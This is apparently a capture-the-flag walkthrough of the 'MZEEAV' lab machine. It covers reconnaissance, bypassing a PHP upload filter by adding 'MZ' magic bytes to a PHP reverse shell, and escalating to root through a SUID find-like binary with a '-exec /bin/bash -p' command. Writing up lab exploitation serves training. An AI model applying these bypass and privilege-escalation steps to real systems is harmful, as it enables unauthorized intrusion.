---
icon: ubuntu
---

# MZEEAV - Intermediate

## <mark style="color:blue;">Gaining Access</mark>

Nmap scan:

```
# Nmap TCP
nmap -A -T4 -p- -Pn 192.168.174.33 -oN scans/nmap-tcpall
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-29 23:08 EDT
Nmap scan report for 192.168.174.33
Host is up (0.033s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u2 (protocol 2.0)
| ssh-hostkey: 
|   3072 c9:c3:da:15:28:3b:f1:f8:9a:36:df:4d:36:6b:a7:44 (RSA)
|   256 26:03:2b:f6:da:90:1d:1b:ec:8d:8f:8d:1e:7e:3d:6b (ECDSA)
|_  256 fb:43:b2:b0:19:2f:d3:f6:bc:aa:60:67:ab:c1:af:37 (ED25519)
80/tcp open  http    Apache httpd 2.4.56 ((Debian))
|_http-title: MZEE-AV - Check your files
|_http-server-header: Apache/2.4.56 (Debian)
Device type: general purpose
Running: Linux 5.X
OS CPE: cpe:/o:linux:linux_kernel:5
OS details: Linux 5.0 - 5.14
Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 23/tcp)
HOP RTT      ADDRESS
1   27.31 ms 192.168.45.1
2   27.24 ms 192.168.45.254
3   27.42 ms 192.168.251.1
4   27.76 ms 192.168.174.33
```

### <mark style="color:$primary;">HTTP Port 80 TCP</mark>

<figure><img src="../../.gitbook/assets/image (1069).png" alt=""><figcaption></figcaption></figure>

I know I can upload a file, I am going to do some Directory Busting and see what I can uncover before I start playing around with the upload functionality

#### <mark style="color:$primary;">Dirsearch</mark>

```
dirsearch -u http://192.168.174.33/
```

<figure><img src="../../.gitbook/assets/image (1070).png" alt=""><figcaption></figcaption></figure>

There is a backups endpoint I am going to check it out

<figure><img src="../../.gitbook/assets/image (1071).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1072).png" alt=""><figcaption></figcaption></figure>

The files look similar to the website I was browsing it also leaks the websites root directory. I am going to checkout upload.php and look at how it works

<figure><img src="../../.gitbook/assets/image (1073).png" alt=""><figcaption></figcaption></figure>

First it opens the file that's been uploaded to a temporary location for reading

```
#Opens the file that's been uploaded to the temporary location for reading
$F=fopen($tmp_location,"r");

#Reads the first two bytes of the uploaded file.
$magic=fread($F,2);

#Closes the file handle
fclose($F);

#Converts the binary data $magic into a hexadecimal string using bin2hex().
$magicbytes = strtoupper(substr(bin2hex($magic),0,4)); 

#logging
error_log(print_r("Magicbytes:" . $magicbytes, TRUE));

/* if its not a PEFILE block it - str_contains onlz php 8*/
//if ( ! (str_contains($magicbytes, '4D5A'))) {

#Searches for '4D5A' within the string $magicbytes. If '4D5A' is not found, strpos() will return false.
if ( strpos($magicbytes, '4D5A') === false ) {
        echo "Error no valid PEFILE\n";
        error_log(print_r("No valid PEFILE", TRUE));
        error_log(print_r("MagicBytes:" . $magicbytes, TRUE));
        exit ();
}

#If true, it will rename the file to it's original uploaded name
rename($tmp_location, $location);
```

If we want the uploaded file remain it name, we need to bypass the restriction. It use **`bin2hex`** to convert the first 2 bytes of the uploaded file and check if it is 4D5A, we can use [this](https://encode-decode.com/bin2hex-decode-online/) to decode it. We will get the result as MZ

<figure><img src="../../.gitbook/assets/image (1074).png" alt=""><figcaption></figcaption></figure>

### <mark style="color:$primary;">Bypassing File Upload</mark>

I am going to intercept the upload request using burpusite, and upload a pentestmonkey php reverse shell. I'll use [https://www.revshells.com/](https://www.revshells.com/) to create it

<figure><img src="../../.gitbook/assets/image (1075).png" alt=""><figcaption></figcaption></figure>

Make sure you have burpsuite ready to intercept upload the rev.php file

<figure><img src="../../.gitbook/assets/image (1076).png" alt=""><figcaption></figcaption></figure>

Once you intercept the request add the MZ magicbytes and forward the reqeust. Now make sure you have a listener ready and visit the following page:

<figure><img src="../../.gitbook/assets/image (1077).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1078).png" alt=""><figcaption></figcaption></figure>

And we got a shell as www-data

## <mark style="color:blue;">Privilege Escalation</mark>

<figure><img src="../../.gitbook/assets/image (1079).png" alt=""><figcaption></figcaption></figure>

another user besides root, I'll keep that in mind.

### <mark style="color:$primary;">Linpeas</mark>

<figure><img src="../../.gitbook/assets/image (1080).png" alt=""><figcaption></figcaption></figure>

Linpeas reveals an interesting SUID, and it has dome interesting permissions we are only allowed to execute it.

### <mark style="color:$primary;">Masked Find SUID</mark>

<figure><img src="../../.gitbook/assets/image (1082).png" alt=""><figcaption></figcaption></figure>

it has a help functionality, not only that but it says we can exec commands with it!

<figure><img src="../../.gitbook/assets/image (1083).png" alt=""><figcaption></figcaption></figure>

It's being weird, says its missing an argument&#x20;

<figure><img src="../../.gitbook/assets/image (1084).png" alt=""><figcaption></figcaption></figure>

This is basically a find binary! We can use [**GTFObins**](https://gtfobins.github.io/gtfobins/find/) to get root

<figure><img src="../../.gitbook/assets/image (1085).png" alt=""><figcaption></figcaption></figure>

```
/opt/fileS . -exec /bin/bash -p \;
```

<figure><img src="../../.gitbook/assets/image (1086).png" alt=""><figcaption></figcaption></figure>

And we got a shell as root!
